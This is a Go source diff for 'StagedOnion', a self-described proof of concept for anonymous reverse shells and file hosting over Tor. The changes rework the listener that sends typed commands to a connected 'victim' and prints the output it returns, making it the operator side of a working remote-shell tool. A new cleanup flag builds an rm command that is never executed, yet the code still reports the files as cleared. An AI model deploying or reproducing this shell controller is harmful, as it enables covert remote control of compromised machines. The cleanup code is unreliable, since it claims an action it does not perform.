@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/exec"
 	"strings"
 	"time"
 
@@ -29,14 +30,24 @@ func (rh *reverseHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	case http.MethodGet:
 		// Check if the victim has connected already, if not, show welcome
 		if !rh.instantiated {
-			fmt.Println("[+] Received reverse shell connection! Sending init command")
+			fmt.Println("[+] Received reverse shell connection!")
 			rh.instantiated = true
 		}
 		// Send the command
-		w.Write([]byte(rh.command))
-		// Wait for a response
-		rh.waiting = true
-		rh.command = ""
+		if !rh.waiting && rh.instantiated {
+			// Get input for the next command
+			reader := bufio.NewReader(os.Stdin)
+			fmt.Print(rh.prompt)
+			text, _ := reader.ReadString('\n')
+			rh.command = text
+			w.Write([]byte(rh.command))
+			// Start waiting for a response
+			rh.waiting = true
+		} else {
+			// If we are waiting for a response but receive another cmd request, send a blank command
+			w.Write([]byte(""))
+		}
+
 	// A post request signifies command output, so, ouput the data to the screen accordingly
 	case http.MethodPost:
 		// Decode the request body and print to stdout
@@ -49,7 +60,7 @@ func (rh *reverseHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		bodyString := string(bodyBytes)
 		decodedBody, err := url.QueryUnescape(bodyString)
 		if err != nil {
-			fmt.Println("[-] Response received but cannot be decoded")
+			fmt.Println("[-] Response received but cannot be decoded (url encoding)")
 			// Finished waiting
 			rh.waiting = false
 		}
@@ -63,22 +74,23 @@ func main() {
 	fmt.Println("StagedOnion | @jamesfoxdev | github.com/jamesfoxdev")
 
 	flag.Usage = func() {
-		fmt.Println("A tool for creating anonymous reverse shells and file hosting, accessible from computers without Tor installed.")
+		fmt.Println("A PoC for creating anonymous reverse shells and file hosting, accessible from computers without Tor installed.")
+		flag.PrintDefaults()
 	}
 	shell := flag.Bool("shell", false, "Start the reverse HTTP listener")
-	iCmd := flag.String("icmd", "", "Init command to be run by the agent")
 	directory := flag.String("dir", "", "A directory to serve")
+	clear := flag.Bool("clear", false, "Clear the working directory of old temporary Tor files")
 	flag.Parse()
+
+	if *clear {
+		exec.Command("rm", "data-dir-*")
+		fmt.Println("[*] Cleared temp files")
+	}
 
 	// Either --shell or --dir need to be called so check for that
 	if *directory == "" && !*shell {
 		fmt.Println("[-] Requires either --shell or --dir or both")
 		os.Exit(1)
-	}
-
-	// Setting first command has no effect if the reverse shell isnt active
-	if !*shell && *iCmd != "" {
-		fmt.Printf("[-] Warning: First command '%v'\n will have no effect without --shell", *iCmd)
 	}
 
 	// A shell cannot exist at the same time as serving a directory, so check if those flags where set together
@@ -124,24 +136,8 @@ func main() {
 	if *shell {
 		fmt.Println("[*] Waiting for shell connection...")
 		// Set initial conditions to waiting to provent overiding a the initial command that may not have been executed yet
-		rh := &reverseHandler{command: *iCmd, prompt: "shell> ", waiting: true}
+		rh := &reverseHandler{command: "", prompt: "shell> ", waiting: false}
 		httpServer.Handle("/", rh)
-
-		// Handle user input
-		go func() {
-			for {
-				// Check if a shell has been received
-				// Only after receiving output from the last command can we accept new input
-				if !rh.waiting && rh.instantiated {
-					// Get input for the next command
-					reader := bufio.NewReader(os.Stdin)
-					fmt.Print(rh.prompt)
-					text, _ := reader.ReadString('\n')
-					rh.command = text
-					rh.waiting = true
-				}
-			}
-		}()
 	}
 
 	if *directory != "" {
